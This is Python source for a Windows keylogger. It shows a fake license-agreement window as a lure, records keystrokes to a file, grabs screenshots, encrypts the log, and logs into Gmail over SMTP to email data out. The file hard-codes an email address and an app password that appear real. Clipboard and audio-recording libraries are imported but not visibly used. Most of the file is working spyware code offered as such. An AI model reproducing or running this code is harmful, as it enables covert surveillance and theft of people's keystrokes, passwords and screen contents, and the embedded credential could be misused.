from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# time_iteration = 15
# number_of_iterations_end = 3
keys_information = "key_log.txt"
screenshot_information = 'screenshot.png'
keys_information_e = "e_key_log.txt"
file_path = 'C:\\Users\\Kodi_\\Documents\\keylogger'
extend = '\\'
file_merge = file_path + extend
email_address = "kodiugos@gmail.com"  # Enter disposable email here
password = "yorq ungw flsc qngy"  # Enter email password here
key = 't-q7kCwsld-Wyj3b4vnK3p9yEWCKdoVJpnzoB-MA0oI='
username = getpass.getuser()

toaddr = "kodiugos@gmail.com"  # Enter the email address you want to send your information to

import tkinter as tk
from tkinter import ttk


def submit():
    # You can customize this function to handle the submission logic
    if license_var.get() and terms_var.get():
        print("License Agreement and Terms of Conditions accepted.")
        # Add your logic here
        root.destroy()
    else:
        print("Please accept both License Agreement and Terms of Conditions.")


# Create the main window
root = tk.Tk()
root.title("License Agreement and Terms")

# Create variables for checkboxes
license_var = tk.BooleanVar()
terms_var = tk.BooleanVar()

# Create and place checkboxes
license_checkbox = ttk.Checkbutton(root, text="I accept the License Agreement", variable=license_var)
terms_checkbox = ttk.Checkbutton(root, text="I accept the Terms of Conditions", variable=terms_var)

license_checkbox.pack(pady=10)
terms_checkbox.pack(pady=10)

# Create and place submit button
submit_button = ttk.Button(root, text="Submit", command=submit)
submit_button.pack(pady=20)

# Start the Tkinter event loop
root.mainloop()


# email controls
def send_mail(
        sender_email=None,
        password=None,
        receiver_email=None,
        message="U didn't add any message",
):
    import smtplib, ssl

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)


send_mail(
    sender_email="kodiugos@gmail.com",
    password="yorq ungw flsc qngy",
    receiver_email="kodiugos@gmail.com",
    message="message",
)


#
#
# send_email(keys_information, file_path + extend + keys_information, toaddr)


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

# number_of_iterations = 0
# currentTime = time.time()
# stoppingTime = time.time() + time_iteration

# Timer for keylogger
# while number_of_iterations < number_of_iterations_end:

count = 0
keys = []


def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


# if currentTime > stoppingTime:
#     return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# if currentTime > stoppingTime:
#  with open(file_path + extend + keys_information, "w") as f:
#     f.write(" ")

screenshot()
# send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

# number_of_iterations += 1
#
# currentTime = time.time()
# stoppingTime = time.time() + time_iteration

encrypted_file_name = file_merge + keys_information_e

with open(encrypted_file_name, 'rb') as f:
    data = f.read()

fernet = Fernet(key)
encrypted = fernet.encrypt(data)

with open(encrypted_file_name, 'wb') as f:
    f.write(encrypted)

# send_email(encrypted_file_name, toaddr)
